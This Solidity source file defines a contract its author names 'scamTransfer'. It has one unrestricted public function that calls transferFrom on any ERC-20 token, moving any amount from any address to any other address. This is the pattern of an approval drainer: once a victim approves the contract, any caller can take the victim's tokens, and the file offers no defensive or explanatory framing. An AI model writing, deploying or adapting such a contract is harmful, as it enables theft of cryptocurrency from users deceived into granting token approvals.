// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "IERC20.sol";

contract scamTransfer {

    function transfer(address token, address from, address to, uint256 amount) public {
        IERC20(token).transferFrom(from, to, amount);
    }
}